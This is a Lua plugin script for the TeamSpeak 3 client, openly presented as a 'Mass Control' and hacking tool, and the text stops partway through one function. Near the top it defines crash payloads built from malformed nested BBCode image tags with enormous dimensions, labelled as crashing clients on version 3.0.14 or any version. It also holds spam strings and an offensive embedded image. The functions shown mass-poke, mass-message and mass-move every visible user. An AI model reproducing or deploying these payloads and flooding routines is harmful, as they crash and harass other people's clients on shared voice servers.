require("ts3defs")
require("ts3errors")
require("ts3events")
require("ts3autoload")
local SCRIPT = "Extended Mass Control Module"
local SCRIPTSHORT = "EMC"
local SCRIPT1 = "Mass Control Module"
local SCRIPT1SHORT = "MCM"
local SCRIPT2 = "Mass ExoticHackers Tools"
local SCRIPT2SHORT = "MEHT"
local VERSION = "1.1.1"
local AUTHOR = "Willy_Sunny, Exotic Hackers, B1uscr34m"
local EMAIL = "piracy@teamspeakusa.com"
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- Installation Instructions:
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-- %ts3dir%: "c:\program files (x68)\teamspeak 3 client" OR "c:\program files\teamspeak 3 client" OR "C:\Users\YOUR USERNAME\AppData\Roaming\TS3Client"
-- a) If you want to use the full plugin:
-- a1) Download the plugin here: http://www.mediafire.com/download/ug7sjs6uary7mp6/emcm.ts3_addon
-- a2) Install the plugin
-- a3) Goto step c)
-- b) If you want to run this script seperatly: 
-- b1) Save this script as "masscontrolmodule.lua" in your "%ts3dir%\plugins\lua_plugin" folder.
-- b2) In teamspeak, any window, where chat would be enter: "/lua load masscontrol.lua" -- Response will be: "Lua script loaded"
-- b3) Now go to step c)
-- c) In Teamspeak press [CTRL]+[SHIFT]+[P] or go to 'Settings -> Plugins' and check the 'Lua Plugin' Checkbox.
-- c1) Click on Reload all then mark 'Lua Plugin' and click on Settings.
-- c2) Uncheck 'testmodule' and restart Teamspeak 3 Client or click on 'Reload all'
-- d) Call everything in here named "function TEXTHERE" from the TeamSpeak 3 chat via: /lua run <function>
-- Note that the serverConnectionHandlerID of the current server is always passed.
--
-- Settings
local EMC_DEBUG = true
local emcCol = { 'Green', 'Yellow', 'Red', 'Blue' }
local RANDCOL = ( emcCol[ math.random( #emcCol ) ] )
--local emcPrefix = "[color="Blue"]([/color][color="Green"]EMC[/color][color="Blue"])[/color] "
-- colrandomizer()
-- -----------------------------=LOGGING=-------------------------------------
if EMC_DEBUG == true then
-- local logMSG = ("loading..." --, SCRIPT , VERSION)
ts3.printMessageToCurrentTab("[color=".. RANDCOL .."]_-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-_[/color]")
ts3.printMessageToCurrentTab("[color=darkgreen]".. SCRIPT .."[/color] [color=white][[/color][color=orange]".. VERSION .."[/color][color=white]][/color] loading...")
-- Log(LogMSG)
end
-- ____________________________-=LOGGING=-____________________________________
-- Variables
local FUNCTIONS = "Mass Moving, Mass Kicking, Mass Channel Kicking, Mass Banning, Mass Messaging, Mass Poking, Mass Crashing"
local HLPTXT = "Use [b][color=red]/lua run emc[/color][/b] to see a list of commands!"
-- Crash Texts
CrashMSG = "[img][img]//http://www.teamspeak.com/templates/teamspeak_v3/images/blank.gif[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser75.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser7a.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser7b.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser75.png?ver=4.6.0.24[/img][/img]"
multiCrashMSG = "[img][img]//1/z[/img][/img][img][img]//2/z[/img][/img][img][img]//3/z[/img][/img][img][img]//4/z[/img][/img][img][img]//5/z[/img][/img][img][img]//6/z[/img][/img][img][img]//7/z[/img][/img][img][img]//8/z[/img][/img][img][img]//9/z[/img][/img][img][img]//10/z[/img][/img][img][img]//11/z[/img][/img][img][img]//12/z[/img][/img][img][img]//13/z[/img][/img][img][img]//14/z[/img][/img][img][img]//15/z[/img][/img][img][img]//16/z[/img][/img][img][img]//17/z[/img][/img][img][img]//18/z[/img][/img][img][img]//19/z[/img][/img][img][img]//20/z[/img][/img][img][img]//21/z[/img][/img][img][img]//22/z[/img][/img][img][img]//23/z[/img][/img][img][img]//24/z[/img][/img][img][img]//25/z[/img][/img][img][img]//26/z[/img][/img][img][img]//27/z[/img][/img][img][img]//28/z[/img][/img][img][img]//29/z[/img][/img][img][img]//30/z[/img][/img][img][img]//31/z[/img][/img]"
hiddenCrashMSG = "[img][img] width=\"999999\" height=\"999999\"[/img][/img][img][img]//http://www.teamspeak.com/templates/teamspeak_v3/images/blank.gif[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser75.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser7a.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser7b.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser75.png?ver=4.6.0.24[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser7z.png?ver=4.6.0.28[/img][/img]"
pokeCrashMSG = "[img]//http://i.answers.microsoft.com/static/images/defaultuser7z.png?ver=4.6.0.28[/img]"
-- Other Texts
clearChat = "[img][img] width=\"999999\" height=\"999999\"[/img][/img]"
clearChatLONG = "[img][img]\" width=\"99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999\" height=\"99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999[/img][/img]"
SpamMSG = "SPAMSPAMSPAMSPAMSPAMSPAMSPAMSPAMSPAMSPAMSPAMSPAMSPAMSPAMSPAMSPAMSPAMSPAMSPAMSPAMSPAMSPAMSPAMSPAM"
ShockerMSG = "[url=http://akk.li/pics/anne.jpg][img][img]\" width=\"99999\" height=\"10\" style=\"background-color:red;[/img][/img][/url][url=http://akk.li/pics/anne.jpg][img][img]\" width=\"99999\" height=\"10\" style=\"background-color:orange;[/img][/img][/url][url=http://akk.li/pics/anne.jpg][img][img]\" width=\"99999\" height=\"10\" style=\"background-color:yellow;[/img][/img][/url][url=http://akk.li/pics/anne.jpg][img][img]\" width=\"99999\" height=\"10\" style=\"background-color:green;[/img][/img][/url][url=http://akk.li/pics/anne.jpg][img][img]\" width=\"99999\" height=\"10\" style=\"background-color:blue;[/img][/img][/url][url=http://akk.li/pics/anne.jpg][img][img]\" width=\"99999\" height=\"10\" style=\"background-color:indigo;[/img][/img][/url][url=http://akk.li/pics/anne.jpg][img][img]\" width=\"99999\" height=\"10\" style=\"background-color:violet;[/img][/img][/url]"
TitleMSG = "[url=#][img][img]\" width=\"50\" height=\"50\" title=\"YES\" style=\"background-color:black;[/img][/img][/url]"
RainbowMSG = "[img][img]\" width=\"99999\" height=\"10\" style=\"background-color:red;[/img][/img][img][img]\" width=\"99999\" height=\"10\" style=\"background-color:orange;[/img][/img][img][img]\" width=\"99999\" height=\"10\" style=\"background-color:yellow;[/img][/img][img][img]\" width=\"99999\" height=\"10\" style=\"background-color:green;[/img][/img][img][img]\" width=\"99999\" height=\"10\" style=\"background-color:blue;[/img][/img][img][img]\" width=\"99999\" height=\"10\" style=\"background-color:indigo;[/img][/img][img][img]\" width=\"99999\" height=\"10\" style=\"background-color:violet;[/img][/img]"
GERFlagMSG = "[img][img]\" width=\"99999\" height=\"10\" style=\"background-color:black;[/img][/img][img][img]\" width=\"99999\" height=\"10\" style=\"background-color:red;[/img][/img][img][img]\" width=\"99999\" height=\"10\" style=\"background-color:gold;[/img][/img]"
IRISHFlagMSG = "[img][img]\" width=\"40\" height=\"99999\" style=\"background-color:green;[/img][/img][img][img]\" width=\"40\" height=\"0\" style=\"background-color:white;[/img][/img][img][img]\" width=\"40\" height=\"99999\" style=\"background-color:orange;[/img][/img]"
PenisMSG = "[img][img]data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAANAA0DASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAABwb/xAAkEAACAgEDAwUBAAAAAAAAAAABAgMEBQYRIhIUIQAHEyMxYv/EABQBAQAAAAAAAAAAAAAAAAAAAAD/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCv9wcWclkdR3Tenhkwun47lMJHC/xyk2iXVpEZo2+pOUZRuI87quyh6E8zr2HSWe1hiJMDUyL1E7y/ZnYB78M0iBIG4nYRraVQWLjpiKhV6uKZofnovF2BxjtRd3FEPyvHKTIkK/zGrrGNgBsg2AHgB//Z[/img][/img]"
CarrotMSG = "[img][img]data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAAOwwAADsMBx2+oZAAAAPdJREFUOMuVU7GuwjAMvLTUKB1Q3tObWfjLTkVCWfhGkGBiQoGhqAZkhqqQlETti2RFcXxn+5yAmTFmeV2Kv/s2w8jS1kjqfKucysYIbpVTMV/vHyWIgf0qFDNHA4lIAICZ1bCNPru2RmYpsGyAfVOAiCSvy6QuWQrsTsDv9Y5dVeBZN1FdvkQkInnYEu708Q1JfFG1NfLWoAfnTRfoXFjZeVFgZe9g5mAqySkYM20qWSz7kOS8KJIE7ynk/AfgGFxya1Bq4Md2/QzLBwAFQKRefjyPI7jtUs+3aeBXBQBwEQXdmknAgOAiXZxZHyYDg6fsP9v//o0XqeGrV7rZKZIAAAAHdElNRQfcBhgLIgQfT5H8AAAAAElFTkSuQmCC[/img][/img]"
channelID = 0
-- -----------------------------=LOGGING=-------------------------------------
if EMC_DEBUG == true then
-- local logMSG = ("loading..." --, SCRIPT , VERSION)
 ts3.printMessageToCurrentTab("[color=darkgreen]".. SCRIPTSHORT .."[/color] variables initialized.")
-- Log(LogMSG)
end
-- ____________________________-=LOGGING=-____________________________________
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--======================================================================================================================================================================
-- Core Functions
--======================================================================================================================================================================
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
clock = os.clock
function sleep(n)  -- seconds
  local t0 = clock()
  while clock() - t0 <= n do end
end
function wsleep(n)
  if n > 0 then os.execute("ping -n " .. tonumber(n+1) .. " localhost > NUL") end
end
function emc()
	local emcCol = { 'Green', 'Yellow', 'Red', 'Blue' }
	local RANDCOL = ( emcCol[ math.random( #emcCol ) ] )
	ts3.printMessageToCurrentTab("[u][color=".. RANDCOL .."]".. SCRIPT1 ..": [b]Commands[/b][/color][/u]")
	ts3.printMessageToCurrentTab("Show the current channel ID that you are in: [color=red]/lua run getChannelID[/color]")
	ts3.printMessageToCurrentTab("Mass Mover Script (within currently subscribed channel): [color=red]/lua run mm[/color]")
	ts3.printMessageToCurrentTab("Mass Poke Script (within currently subscribed channel): [color=red]/lua run mp <message>[/color]")
	ts3.printMessageToCurrentTab("Mass Messaging Script (within currently subscribed channel): [color=red]/lua run mmsg <message>[/color]")
	ts3.printMessageToCurrentTab("Mass Message & Poke Script (within currently subscribed channel): [color=red]/lua run mmp <message>[/color]")
	ts3.printMessageToCurrentTab("Global Mass Mover Script (subscribe all possible channels before moving): [color=red]/lua run gmm[/color]")
	ts3.printMessageToCurrentTab("Global Mass Poke Script (subscribe all possible channels before acting): [color=red]/lua run gmp <message>[/color]")
	ts3.printMessageToCurrentTab("Global Mass Message Script (subscribe all possible channels before acting): [color=red]/lua run gmmsg <message>[/color]")
	ts3.printMessageToCurrentTab("Global Mass Message & Poke Script (subscribe all possible channels before acting): [color=red]/lua run gmmp <message>[/color]")
	-- local emcCol = { 'Green', 'Yellow', 'Red', 'Blue' }
	-- local RANDCOL = ( emcCol[ math.random( #emcCol ) ] )
	ts3.printMessageToCurrentTab("[u][color=".. RANDCOL .."]".. SCRIPT2 ..": [b]Commands[/b][/color][/u]")
	ts3.printMessageToCurrentTab("Mass Kick Script: [color=red]/lua run mk <message>[/color]")
	ts3.printMessageToCurrentTab("Mass Channel Kick Script: [color=red]/lua run mck <message>[/color]")
	ts3.printMessageToCurrentTab("Mass Ban Script: [color=red]/lua run mb <duration> <message>[/color]")
	-- local emcCol = { 'Green', 'Yellow', 'Red', 'Blue' }
	-- local RANDCOL = ( emcCol[ math.random( #emcCol ) ] )
	ts3.printMessageToCurrentTab("[u][color=".. RANDCOL .."]".. SCRIPT ..": [b]Commands[/b][/color][/u]")
	ts3.printMessageToCurrentTab("UID Search Script: [color=red]/lua run uid <uid>[/color]")
	ts3.printMessageToCurrentTab("Name Search Script: [color=red]/lua run name <name>[/color]")
	ts3.printMessageToCurrentTab("Self Kick Script: [color=red]/lua run selfkick[/color]")
	ts3.printMessageToCurrentTab("Spam Script: [color=red]/lua run spam[/color]")
	ts3.printMessageToCurrentTab(SCRIPTSHORT .." Spam Script: [color=red]/lua run emcspam[/color]")
	ts3.printMessageToCurrentTab("PokeSpam Script: [color=red]/lua run emcpokespam <#ofPokes> <#ofSecsBetweenPokes> <clientID> <message>[/color]")
	ts3.printMessageToCurrentTab("Mass Poke Script 2: [color=red]/lua run pokeall[/color]")
	ts3.printMessageToCurrentTab("Channel Crash Script: [color=red]/lua run ccrash[/color]")
	ts3.printMessageToCurrentTab("Global Multi Crash Script (Works with every version) (subscribe all possible channels before crashing): [color=red]/lua run mcrash[/color]")
	ts3.printMessageToCurrentTab("Global Mass Hidden Crash Script (subscribe all possible channels before crashing): [color=red]/lua run mhcrash[/color]")
	ts3.printMessageToCurrentTab("Show Text to crash clients running 3.0.14: [color=red]/lua run ctxt[/color]")
	ts3.printMessageToCurrentTab("Show Text to hidden crash clients running 3.0.14: [color=red]/lua run hctxt[/color]")
	ts3.printMessageToCurrentTab("Show Text to crash clients running [b]any[/b] Version: [color=red]/lua run mctxt[/color]")
	ts3.printMessageToCurrentTab("Show Text to poke crash clients running 3.0.14: [color=red]/lua run pctxt[/color]")
end
function emchelp()
	local emcCol = { 'Green', 'Yellow', 'Red', 'Blue' }
	local RANDCOL = ( emcCol[ math.random( #emcCol ) ] )
	ts3.printMessageToCurrentTab("[u][color=".. RANDCOL .."]".. SCRIPT ..": [b]Help[/b][/color][/u]")
	ts3.printMessageToCurrentTab("Show Text to crash clients running 3.0.14: [color=red]/lua run ctxt[/color]")
end
function emcinfo()
	local emcCol = { 'Green', 'Yellow', 'Red', 'Blue' }
	local RANDCOL = ( emcCol[ math.random( #emcCol ) ] )
	ts3.printMessageToCurrentTab("[u][color=".. RANDCOL .."]".. SCRIPT ..": [b]Info[/b][/color][/u]")
	ts3.printMessageToCurrentTab("Show Text to crash clients running 3.0.14: [color=red]/lua run ctxt[/color]")
end
function Log()
 ts3.printMessageToCurrentTab(logMSG)
-- ts3.logMessage(logMSG, severity, channel, logID)
-- debugPrint(logMSG)
end
function colrandomizer()
	local myTable = { 'Green', 'Yellow', 'Red', 'Blue' }
	local RANDCOL = ( myTable[ math.random( #myTable ) ] )
end
function PrintTable( t, indent, done )
    done = done or {}
    indent = indent or 0
    local output = ""
    for key, value in pairs( t ) do
        if type( value ) == "table" and not done[value] then
            done [value] = true
            output = output .. tostring ( key ) .. ":" .. PrintTable( value, indent + 2, done ) .. "\n"
        else
            output = output .. tostring ( key ) .. "\t=\t" .. type( value ) .. "\n"
        end
    end
    return output
end
function getClientList(serverConnectionHandlerID)
	local clients, error = ts3.getClientList(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessage(serverConnectionHandlerID, "Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error getting client list: " .. error)
		return
	end
	return clients
end
function printClientList(serverConnectionHandlerID)
	local clist = getClientList(serverConnectionHandlerID)
	local content = PrintTable(clist)
	ts3.printMessageToCurrentTab(content)
end
function getOwnID(serverConnectionHandlerID)
  local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	if error ~= ts3errors.ERROR_ok then
		return
	elseif myClientID == 0 then
		return
	end
	return myClientID
end
function getUserChannelID(serverConnectionHandlerID, userID)
  local channelID, error = ts3.getChannelOfClient(serverConnectionHandlerID, userID)
	if error ~= ts3errors.ERROR_ok then
		return 1
	end
	return channelID
end
function getUsernameByID(serverConnectionHandlerID, userID)
  local clientName, clientNameError = ts3.getClientVariableAsString(serverConnectionHandlerID, userID, ts3defs.ClientProperties.CLIENT_NICKNAME)
	if clientNameError ~= ts3errors.ERROR_ok then
		return "Unknown"
	end
	return clientName
end
-- Used to escape "'s by toCSV
function escapeCSV (s)
  if string.find(s, '[,"]') then
    s = '"' .. string.gsub(s, '"', '""') .. '"'
  end
  return s
end
-- Convert from CSV string to table (converts a single line of a CSV file)
function fromCSV (s)
  s = s .. ','        -- ending comma
  local t = {}        -- table to collect fields
  local fieldstart = 1
  repeat
    -- next field is quoted? (start with `"'?)
    if string.find(s, '^"', fieldstart) then
      local a, c
      local i  = fieldstart
      repeat
        -- find closing quote
        a, i, c = string.find(s, '"("?)', i+1)
      until c ~= '"'    -- quote not followed by quote?
      if not i then error('unmatched "') end
      local f = string.sub(s, fieldstart+1, i-1)
      table.insert(t, (string.gsub(f, '""', '"')))
      fieldstart = string.find(s, ',', i) + 1
    else                -- unquoted; find next comma
      local nexti = string.find(s, ',', fieldstart)
      table.insert(t, string.sub(s, fieldstart, nexti-1))
      fieldstart = nexti + 1
    end
  until fieldstart > string.len(s)
  return t
end
-- Convert from table to CSV string
function toCSV (tt)
  local s = ""
-- ChM 23.02.2014: changed pairs to ipairs 
-- assumption is that fromCSV and toCSV maintain data as ordered array
  for _,p in ipairs(tt) do  
    s = s .. "," .. escapeCSV(p)
  end
  return string.sub(s, 2)      -- remove first comma
end
function isempty(s)
  return s == nil or s == ''
end
function urlencode(str)
   if (str) then
      str = string.gsub (str, "\n", "\r\n")
      str = string.gsub (str, "([^%w ])",
         function (c) return string.format ("%%%02X", string.byte(c)) end)
      str = string.gsub (str, " ", "+")
   end
   return str    
end
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--======================================================================================================================================================================
-- Mass Control Module Functions
--======================================================================================================================================================================
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--
-- Show the current channel ID that you are in (/lua run getChannelID /lua run getMyChanID)
--
function getChannelID(serverConnectionHandlerID)
	-- Get Self ID
	local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own client ID: " .. error)
		return
	end
	if myClientID == 0 then
		ts3.printMessageToCurrentTab("Not connected")
		return
	end
	-- Get which channel we are in
	local myChannelID, error = ts3.getChannelOfClient(serverConnectionHandlerID, myClientID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own channel: " .. error)
		return
	end
	ts3.printMessageToCurrentTab("Channel ID = [b][u]" .. myChannelID .. "[/u][/b]")
end
--
-- Mass Mover Script (within currently subscribed channel) (/lua run mm)
--
function mm(serverConnectionHandlerID, ...)
	-- ts3.printMessageToCurrentTab("= [b][u]Mass Control Module Version 1.2 by [url=http://forum.teamspeak.com/showthread.php?t=57386]Willy_Sunny[/url][/u][/b] =")
	-- Get Self ID
	local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own client ID: " .. error)
		return
	end
	if myClientID == 0 then
		ts3.printMessageToCurrentTab("Not connected")
		return
	end
	-- Get which channel we are in
	local myChannelID, error = ts3.getChannelOfClient(serverConnectionHandlerID, myClientID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own channel: " .. error)
		return
	end
	local clients, error = ts3.getClientList(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error getting client list: " .. error)
		return
	end
	local password = ""
	if type(arg[1]) ~= "nil" then
		password = arg[1]
		ts3.printMessageToCurrentTab("[b][i]== Mass moving " .. #clients - 1 .. " visible clients (Using Password: " .. password .. " ) ==[/i][/b]")
	else
		ts3.printMessageToCurrentTab("[b][i]== Mass moving " .. #clients - 1 .. " ==[/i][/b]")
	end
	local counter = 0
	for i=1, #clients do
		if clients[i] ~= myClientID then
			local error = ts3.requestClientMove(serverConnectionHandlerID, clients[i], myChannelID, password)
			if error == ts3errors.ERROR_ok then
				counter = counter + 1
			else
				clientName = "Error getting client name"
			end
		end
	end
	ts3.printMessageToCurrentTab("[b][i]== Successfully moved " .. counter .. " / " .. #clients - 1 .. " clients. ==[/i][/b]")
end
--
-- Mass Poke Script (within currently subscribed channel) (/lua run mp <message>)
--
function mp(serverConnectionHandlerID, ...)
	-- ts3.printMessageToCurrentTab("= [b][u]Mass Control Module Version 1.2 by [url=http://forum.teamspeak.com/showthread.php?t=57386]Willy_Sunny[/url][/u][/b] =")
	-- Get Self ID
	local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own client ID: " .. error)
		return
	end
	if myClientID == 0 then
		ts3.printMessageToCurrentTab("Not connected")
		return
	end
	-- Get which channel we are in
	local myChannelID, error = ts3.getChannelOfClient(serverConnectionHandlerID, myClientID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own channel: " .. error)
		return
	end
	local clients, error = ts3.getClientList(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error getting client list: " .. error)
		return
	end
	-- Process Argument message
	local argMsg = ""
	for i,v in ipairs(arg) do
		argMsg = argMsg .. tostring(v) .. " "
	end
	local counter = 0
	ts3.printMessageToCurrentTab("[b][i]== Mass poking " .. #clients - 1 .. " visible clients ==[/i][/b]")
	for i=1, #clients do
		if clients[i] ~= myClientID then
			local error = ts3.requestClientPoke(serverConnectionHandlerID, clients[i], argMsg)
			if error == ts3errors.ERROR_ok then
				counter = counter + 1
			else
				print("Error poking client ID: " .. clients[i] .. "\n")
			end
		end
	end
	ts3.printMessageToCurrentTab("[b][i]== Successfully poked " .. counter .. "/" .. #clients - 1 .. " clients ==[/i][/b]")
end
--
-- Mass Messaging Script (within currently subscribed channel) (/lua run mmsg <message>)
--
function mmsg(serverConnectionHandlerID, ...)
	-- ts3.printMessageToCurrentTab("= [b][u]Mass Control Module Version 1.2 by [url=http://forum.teamspeak.com/showthread.php?t=57386]Willy_Sunny[/url][/u][/b] =")
	-- Get Self ID
	local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own client ID: " .. error)
		return
	end
	if myClientID == 0 then
		ts3.printMessageToCurrentTab("Not connected")
		return
	end
	-- Get which channel we are in
	local myChannelID, error = ts3.getChannelOfClient(serverConnectionHandlerID, myClientID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own channel: " .. error)
		return
	end
	local clients, error = ts3.getClientList(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error getting client list: " .. error)
		return
	end
	-- Process Argument message
	local argMsg = ""
	for i,v in ipairs(arg) do
		argMsg = argMsg .. tostring(v) .. " "
	end
	local counter = 0
	ts3.printMessageToCurrentTab("[b][i]== Mass messaging " .. #clients - 1 .. " visible clients ==[/i][/b]")
	for i=1, #clients do
		if clients[i] ~= myClientID then
			local error = ts3.requestSendPrivateTextMsg(serverConnectionHandlerID, argMsg, clients[i])
			if error == ts3errors.ERROR_ok then
				counter = counter + 1
			else
				print("Error messaging client ID: " .. clients[i] .. "\n")
			end
		end
	end
	ts3.printMessageToCurrentTab("[b][i]== Successfully messaged " .. counter .. "/" .. #clients - 1 .. " clients ==[/i][/b]")
end
--
-- Mass Message & Poke Script (within currently subscribed channel) (/lua run mmp <message>)
--
function mmp(serverConnectionHandlerID, ...)
	-- ts3.printMessageToCurrentTab("= [b][u]Mass Control Module Version 1.2 by [url=http://forum.teamspeak.com/showthread.php?t=57386]Willy_Sunny[/url][/u][/b] =")
	-- Get Self ID
	local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own client ID: " .. error)
		return
	end
	if myClientID == 0 then
		ts3.printMessageToCurrentTab("Not connected")
		return
	end
	-- Get which channel we are in
	local myChannelID, error = ts3.getChannelOfClient(serverConnectionHandlerID, myClientID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own channel: " .. error)
		return
	end
	ts3.printMessageToCurrentTab("Channel ID = " .. myChannelID .. ".")
	local clients, error = ts3.getClientList(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error getting client list: " .. error)
		return
	end
	-- Process Argument message
	local argMsg = ""
	for i,v in ipairs(arg) do
		argMsg = argMsg .. tostring(v) .. " "
	end
	local msgcounter = 0
	local pokecounter = 0
	ts3.printMessageToCurrentTab("[b][i]== Mass poking & messaging " .. #clients - 1 .. " visible clients ==[/i][/b]")
	for i=1, #clients do
		if clients[i] ~= myClientID then
			local error = ts3.requestClientPoke(serverConnectionHandlerID, clients[i], argMsg)
			if error == ts3errors.ERROR_ok then
				pokecounter = pokecounter + 1
			else
				print("Error poking client ID: " .. clients[i] .. "\n")
			end
			local error = ts3.requestSendPrivateTextMsg(serverConnectionHandlerID, argMsg, clients[i])
			if error == ts3errors.ERROR_ok then
				msgcounter = msgcounter + 1
			else
				print("Error messaging client ID: " .. clients[i] .. "\n")
			end
		end
	end
	ts3.printMessageToCurrentTab("[b][i]== Successfully poked " .. pokecounter .. "/" .. #clients - 1 .. " clients, and messaged " .. msgcounter .. "/" .. #clients - 1 .. " clients ==[/i][/b]")
end
--
-- Global Mass Mover Script (subscribe all possible channels before moving) (/lua run gmm)
--
function gmm(serverConnectionHandlerID, ...)
	-- ts3.printMessageToCurrentTab("= [b][u]Mass Control Module Version 1.2 by [url=http://forum.teamspeak.com/showthread.php?t=57386]Willy_Sunny[/url][/u][/b] =")
	-- Get Self ID
	local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own client ID: " .. error)
		return
	end
	if myClientID == 0 then
		ts3.printMessageToCurrentTab("Not connected")
		return
	end
	-- Get which channel we are in
	local myChannelID, error = ts3.getChannelOfClient(serverConnectionHandlerID, myClientID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own channel: " .. error)
		return
	end
	ts3.printMessageToCurrentTab("Channel ID = " .. myChannelID .. ".")
	local error = ts3.requestChannelSubscribeAll(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error subscribing channel: " .. error)
		return
	end
	local clients, error = ts3.getClientList(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error getting client list: " .. error)
		return
	end
	local password = ""
	if type(arg[1]) ~= "nil" then
		password = arg[1]
		ts3.printMessageToCurrentTab("[b][i]== Mass moving " .. #clients - 1 .. " visible clients (Using Password: " .. password .. " ) ==[/i][/b]")
	else
		ts3.printMessageToCurrentTab("[b][i]== Mass moving " .. #clients - 1 .. " ==[/i][/b]")
	end
	local counter = 0
	for i=1, #clients do
		if clients[i] ~= myClientID then
			local error = ts3.requestClientMove(serverConnectionHandlerID, clients[i], myChannelID, password)
			if error == ts3errors.ERROR_ok then
				counter = counter + 1
			else
				clientName = "Error getting client name"
			end
		end
	end
	ts3.printMessageToCurrentTab("[b][i]== Successfully moved " .. counter .. " / " .. #clients - 1 .. " clients. ==[/i][/b]")
end
--
-- Global Mass Poke Script (subscribe all possible channels before moving) (/lua run gmp <message>)
--
function gmp(serverConnectionHandlerID, ...)
	-- ts3.printMessageToCurrentTab("= [b][u]Mass Control Module Version 1.2 by [url=http://forum.teamspeak.com/showthread.php?t=57386]Willy_Sunny[/url][/u][/b] =")
	-- Get Self ID
	local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own client ID: " .. error)
		return
	end
	if myClientID == 0 then
		ts3.printMessageToCurrentTab("Not connected")
		return
	end
	local error = ts3.requestChannelSubscribeAll(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error subscribing channel: " .. error)
		return
	end
	local clients, error = ts3.getClientList(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error getting client list: " .. error)
		return
	end
	-- Process Argument message
	local argMsg = ""
	for i,v in ipairs(arg) do
		argMsg = argMsg .. tostring(v) .. " "
	end
	local counter = 0
	ts3.printMessageToCurrentTab("[b][i]== Mass poking " .. #clients - 1 .. " visible clients ==[/i][/b]")
	for i=1, #clients do
		if clients[i] ~= myClientID then
			local error = ts3.requestClientPoke(serverConnectionHandlerID, clients[i], argMsg)
			if error == ts3errors.ERROR_ok then
				counter = counter + 1
			else
				print("Error poking client ID: " .. clients[i] .. "\n")
			end
		end
	end
